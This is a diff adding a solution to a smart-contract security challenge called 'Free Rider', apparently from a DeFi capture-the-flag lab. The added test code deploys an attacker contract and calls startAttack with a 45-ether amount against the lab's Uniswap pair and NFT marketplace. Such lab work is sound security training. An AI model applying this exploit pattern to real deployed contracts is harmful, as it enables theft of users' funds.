@@ -106,6 +106,27 @@ describe('[Challenge] Free Rider', function () {
 
     it('Execution', async function () {
         /** CODE YOUR SOLUTION HERE */
+        console.log('deploying..., ')
+
+        const attacker = await (await ethers.getContractFactory('FreeRiderAttacker', player)).deploy(
+            player.address,
+            uniswapPair.address,
+            devsContract.address,
+            marketplace.address,
+            {gasLimit: 1000000}
+        );
+   
+        console.log('deployed attacker: ', attacker.address);
+
+        await attacker.startAttack(
+            ethers.utils.parseEther('45', 'ether'),
+            0,
+            attacker.address,
+            "0x00",
+            {
+                gasLimit: 1000000
+            }
+        );
     });
 
     after(async function () {
